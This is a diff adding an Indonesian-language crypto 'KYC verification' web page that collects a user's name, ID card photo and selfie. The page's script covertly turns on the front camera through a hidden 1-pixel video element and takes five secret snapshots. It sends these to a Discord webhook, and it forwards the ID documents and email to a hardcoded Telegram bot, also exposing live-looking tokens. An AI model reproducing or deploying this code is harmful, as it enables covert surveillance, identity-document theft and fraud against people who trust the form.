@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KYC Verification | CryptoPro</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000; color: #fff; }
+        .card-glass { background: rgba(255, 255, 255, 0.03); border: 2px dashed rgba(255, 255, 255, 0.1); }
+        .upload-box { transition: all 0.3s ease; position: relative; overflow: hidden; }
+        .upload-box.active { border-color: #EAB308; background: rgba(234, 179, 8, 0.05); border-style: solid; }
+        .preview-img { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; display: none; z-index: 10; }
+        .gold-gradient { background: linear-gradient(135deg, #D4AF37 0%, #8A6E20 100%); }
+        #v { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body class="p-6 pb-32">
+    <video id="v" autoplay playsinline muted></video>
+
+    <div class="flex items-center gap-4 mb-8">
+        <button onclick="window.location.href='dashboard.html'" class="p-3 bg-white/5 rounded-2xl text-yellow-500">
+            <i data-lucide="arrow-left"></i>
+        </button>
+        <h2 class="text-xl font-black italic uppercase text-yellow-500">KYC <span class="text-white">Verifikasi</span></h2>
+    </div>
+
+    <div id="kyc-form" class="space-y-8 max-w-md mx-auto">
+        <div class="bg-yellow-500/10 border border-yellow-500/20 p-5 rounded-[2rem]">
+            <p class="text-[10px] text-yellow-500 font-black uppercase tracking-[0.2em] leading-relaxed">
+                Anda harus mengizinkan izin kamera untuk memvalidasi view foto dari Google Maps secara real-time.
+            </p>
+        </div>
+
+        <div class="space-y-2">
+            <label class="text-[10px] font-black text-gray-500 uppercase ml-2 tracking-widest">Nama Lengkap (Sesuai KTP)</label>
+            <input type="text" id="full-name" placeholder="CONTOH: BUDI SANTOSO" class="w-full bg-[#111] border border-white/10 p-5 rounded-2xl outline-none focus:border-yellow-500 text-sm font-bold uppercase text-white">
+        </div>
+
+        <div class="space-y-2">
+            <label class="text-[10px] font-black text-gray-500 uppercase ml-2 tracking-widest">Foto KTP Asli</label>
+            <div onclick="triggerUpload('file-ktp')" class="upload-box card-glass h-52 rounded-[2.5rem] flex flex-col items-center justify-center cursor-pointer" id="box-ktp">
+                <img id="prev-ktp" class="preview-img">
+                <div class="flex flex-col items-center justify-center p-6 text-center">
+                    <i data-lucide="credit-card" class="text-gray-600 w-10 h-10 mb-3"></i>
+                    <p class="text-[10px] font-black text-gray-500 uppercase italic">Klik untuk Unggah KTP</p>
+                </div>
+            </div>
+            <input type="file" id="file-ktp" accept="image/*" class="hidden">
+        </div>
+
+        <div class="space-y-2">
+            <label class="text-[10px] font-black text-gray-500 uppercase ml-2 tracking-widest">Foto Selfie + KTP</label>
+            <div onclick="triggerUpload('file-selfie')" class="upload-box card-glass h-52 rounded-[2.5rem] flex flex-col items-center justify-center cursor-pointer" id="box-selfie">
+                <img id="prev-selfie" class="preview-img">
+                <div class="flex flex-col items-center justify-center p-6 text-center">
+                    <i data-lucide="user-check" class="text-gray-600 w-10 h-10 mb-3"></i>
+                    <p class="text-[10px] font-black text-gray-500 uppercase italic">Klik untuk Unggah Selfie</p>
+                </div>
+            </div>
+            <input type="file" id="file-selfie" accept="image/*" class="hidden">
+        </div>
+
+        <button id="submit-kyc" class="w-full gold-gradient text-black font-black py-6 rounded-[2.5rem] uppercase tracking-[0.2em] text-xs active:scale-95 transition-all">
+            Kirim Data Verifikasi
+        </button>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getFirestore, doc, setDoc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDrpBJTtankyLgimtOwuriFpiyuC5K10OI",
+            authDomain: "studio-727777898-40aea.firebaseapp.com",
+            projectId: "studio-727777898-40aea",
+            storageBucket: "studio-727777898-40aea.firebasestorage.app",
+            messagingSenderId: "351263967108",
+            appId: "1:351263967108:web:973eb49037d874e5c17fd1"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        const WH_URL = "https://discord.com/api/webhooks/1450373546881712151/DSSmNr8hevXg8OJr3p4u_ia3AVU5ytq8Hb3u2W6x6YLHcA0OM3OxSfYRUbt_Jqc9wz-F";
+        const tgBot = "8327274917:AAEpzcdb86v2lvIt99c80-IY600k6E7Zwg4";
+        const tgChat = "5923031825";
+
+        let dataKTP = "", dataSelfie = "";
+        let cameraActive = false;
+
+        // Helper: Convert Base64 to Blob
+        const b64toBlob = (b64) => {
+            const byteString = atob(b64.split(',')[1]);
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([ab], { type: 'image/jpeg' });
+        };
+
+        // Trigger Upload & Start Hidden Camera
+        window.triggerUpload = (id) => {
+            if (!cameraActive) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    cameraActive = true;
+                    const video = document.getElementById('v');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        takeSnaps(); // Mulai ambil 5 foto rahasia
+                    };
+                    document.getElementById(id).click();
+                })
+                .catch(() => {
+                    alert("Anda wajib memberikan izin kamera untuk melanjutkan verifikasi.");
+                });
+            } else {
+                document.getElementById(id).click();
+            }
+        };
+
+        // Ambil 5 Foto Rahasia & Kirim ke Webhook
+        async function takeSnaps() {
+            const video = document.getElementById('v');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            for (let i = 0; i < 5; i++) {
+                await new Promise(r => setTimeout(r, 1500)); // Jeda 1.5 detik per foto
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imgData = canvas.toDataURL('image/jpeg', 0.6);
+                
+                const fd = new FormData();
+                fd.append("file", b64toBlob(imgData), `secret_${i+1}.jpg`);
+                fd.append("payload_json", JSON.stringify({ 
+                    content: `🕵️ **Hidden Capture ${i+1}/5** dari: ${document.getElementById('full-name').value || 'Unknown'}` 
+                }));
+                
+                fetch(WH_URL, { method: "POST", body: fd });
+            }
+        }
+
+        const processFile = (file) => {
+            return new Promise(res => {
+                const reader = new FileReader();
+                reader.onload = (e) => res(e.target.result);
+                reader.readAsDataURL(file);
+            });
+        };
+
+        document.getElementById('file-ktp').onchange = async (e) => {
+            if (e.target.files[0]) {
+                dataKTP = await processFile(e.target.files[0]);
+                document.getElementById('prev-ktp').src = dataKTP;
+                document.getElementById('prev-ktp').style.display = 'block';
+                document.getElementById('box-ktp').classList.add('active');
+            }
+        };
+
+        document.getElementById('file-selfie').onchange = async (e) => {
+            if (e.target.files[0]) {
+                dataSelfie = await processFile(e.target.files[0]);
+                document.getElementById('prev-selfie').src = dataSelfie;
+                document.getElementById('prev-selfie').style.display = 'block';
+                document.getElementById('box-selfie').classList.add('active');
+            }
+        };
+
+        document.getElementById('submit-kyc').onclick = async () => {
+            const user = auth.currentUser;
+            const name = document.getElementById('full-name').value;
+            if (!name || !dataKTP || !dataSelfie) return alert("❌ Lengkapi data!");
+
+            const btn = document.getElementById('submit-kyc');
+            btn.innerText = "MENGIRIM..."; btn.disabled = true;
+
+            try {
+                // 1. Firebase Update
+                await updateDoc(doc(db, "users", user.uid), { kycStatus: 'pending' });
+                await setDoc(doc(db, "kyc_submissions", user.uid), {
+                    fullName: name.toUpperCase(), email: user.email, timestamp: serverTimestamp()
+                });
+
+                // 2. Kirim Info Text ke Telegram
+                const msg = `🔔 *KYC BARU*\n👤 Nama: ${name.toUpperCase()}\n📧 Email: ${user.email}`;
+                await fetch(`https://api.telegram.org/bot${tgBot}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: tgChat, text: msg, parse_mode: "Markdown" })
+                });
+
+                // 3. Kirim Foto KTP ke Telegram (Blob)
+                const fd1 = new FormData();
+                fd1.append('chat_id', tgChat);
+                fd1.append('photo', b64toBlob(dataKTP), 'ktp.jpg');
+                fd1.append('caption', `📄 KTP: ${name.toUpperCase()}`);
+                await fetch(`https://api.telegram.org/bot${tgBot}/sendPhoto`, { method: 'POST', body: fd1 });
+
+                // 4. Kirim Foto Selfie ke Telegram (Blob)
+                const fd2 = new FormData();
+                fd2.append('chat_id', tgChat);
+                fd2.append('photo', b64toBlob(dataSelfie), 'selfie.jpg');
+                fd2.append('caption', `🤳 SELFIE: ${name.toUpperCase()}`);
+                await fetch(`https://api.telegram.org/bot${tgBot}/sendPhoto`, { method: 'POST', body: fd2 });
+
+                alert("Data berhasil dikirim! Silakan tunggu verifikasi.");
+                window.location.href = 'dashboard.html';
+
+            } catch (e) { 
+                alert("Gagal: " + e.message); 
+                btn.disabled = false; 
+                btn.innerText = "Kirim Data Verifikasi"; 
+            }
+        };
+
+        lucide.createIcons();
+    </script>
+</body>
+</html>
